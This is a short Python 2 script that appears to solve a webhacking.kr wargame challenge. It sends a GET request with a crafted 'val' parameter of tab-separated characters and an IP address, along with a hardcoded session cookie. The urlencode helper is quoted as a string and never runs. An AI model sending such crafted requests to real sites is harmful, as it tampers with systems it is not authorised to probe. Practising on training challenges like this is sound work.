import requests
from urllib import quote

def urlencode(string):
	print quote(string)


url ="http://webhacking.kr/challenge/codeing/code2.html"


params = {
	"val":"urlencode('1bbbbb_175.197.51.55\tp\ta\ts\ts')" 
}



headers = {
	"Host":"webhacking.kr",
	"Cookie":"PHPSESSID=ce7d7b3317819f9f01951a6263279e37;oldzombie=1"
}

req = requests.get(url, headers=headers, params=params)
print req.content
